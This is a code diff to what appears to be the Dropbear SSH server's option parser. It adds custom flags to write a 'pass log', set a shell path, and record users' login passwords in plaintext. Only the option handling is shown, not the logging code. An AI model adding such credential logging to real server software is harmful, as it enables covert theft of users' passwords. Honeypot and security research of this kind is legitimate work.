@@ -29,6 +29,8 @@
 #include "dbutil.h"
 #include "algo.h"
 
+#include "svr-custum.h"
+
 svr_runopts svr_opts; /* GLOBAL */
 
 static void printhelp(const char * progname);
@@ -92,6 +94,10 @@ static void printhelp(const char * progname) {
 #ifdef DEBUG_TRACE
 					"-v		verbose (compiled with DEBUG_TRACE)\n"
 #endif
+			        "Custum options:\n"
+			        "-l <path_to_log>  create pass log\n"
+					"-q <path_to_shell> shell path\n"
+					"-n  show login password in log\n"
 					,DROPBEAR_VERSION, progname,
 #ifdef DROPBEAR_DSS
 					DSS_PRIV_FILENAME,
@@ -108,6 +114,8 @@ void svr_getopts(int argc, char ** argv) {
 	unsigned int i;
 	char ** next = 0;
 	int nextisport = 0;
+	int next_passlog = 0;
+	int next_shell = 0;
 	char* recv_window_arg = NULL;
 	char* keepalive_arg = NULL;
 	char* idle_timeout_arg = NULL;
@@ -132,6 +140,9 @@ void svr_getopts(int argc, char ** argv) {
 	svr_opts.portcount = 0;
 	svr_opts.hostkey = NULL;
 	svr_opts.pidfile = DROPBEAR_PIDFILE;
+	svr_opts.cust_shell = NULL;
+	svr_opts.cust_show_passlogin = false;
+
 #ifdef ENABLE_SVR_LOCALTCPFWD
 	svr_opts.nolocaltcp = 0;
 #endif
@@ -156,10 +167,24 @@ void svr_getopts(int argc, char ** argv) {
 	opts.listen_fwd_all = 0;
 #endif
 
-	for (i = 1; i < (unsigned int)argc; i++) {
-		if (nextisport) {
+	for(i = 1; i < (unsigned int)argc; i++)
+	{
+		if(nextisport)
+		{
 			addportandaddress(argv[i]);
 			nextisport = 0;
+			continue;
+		}
+		if(next_passlog)
+		{
+			next_passlog = 0;
+			cust_init_log(argv[i]);
+			continue;
+		}
+		if(next_shell)
+		{
+			next_shell = 0;
+			svr_opts.cust_shell = strdup(argv[i]);
 			continue;
 		}
 	  
@@ -239,6 +264,15 @@ void svr_getopts(int argc, char ** argv) {
 					break;
 				case 'I':
 					next = &idle_timeout_arg;
+					break;
+				case 'l':
+					next_passlog = 1;
+					break;
+				case 'q':
+					next_shell = 1;
+					break;
+				case 'n':
+					svr_opts.cust_show_passlogin = true;
 					break;
 #if defined(ENABLE_SVR_PASSWORD_AUTH) || defined(ENABLE_SVR_PAM_AUTH)
 				case 's':
